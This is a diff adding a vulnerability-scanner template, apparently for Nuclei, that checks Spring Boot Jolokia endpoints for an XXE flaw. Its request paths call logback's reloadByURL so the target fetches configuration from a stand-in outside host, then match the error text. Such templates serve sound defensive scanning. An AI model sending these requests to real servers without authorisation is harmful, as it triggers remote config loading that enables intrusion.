@@ -1,0 +1,26 @@
+id: springboot-actuators-jolokia-xxe
+info:
+  author: dwisiswant0
+  name: Spring Boot Actuators (Jolokia) XXE
+  severity: high
+requests:
+- matchers:
+  - status:
+    - 200
+    type: status
+  - condition: and
+    part: body
+    type: word
+    words:
+    - http:\/\/nonexistent:31337\/logback.xml
+    - reloadByURL
+    - JoranException
+  - part: header
+    type: word
+    words:
+    - X-Application-Context
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/nonexistent:31337!/logback.xml'
+  - '{{BaseURL}}/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/nonexistent:31337!/logback.xml'
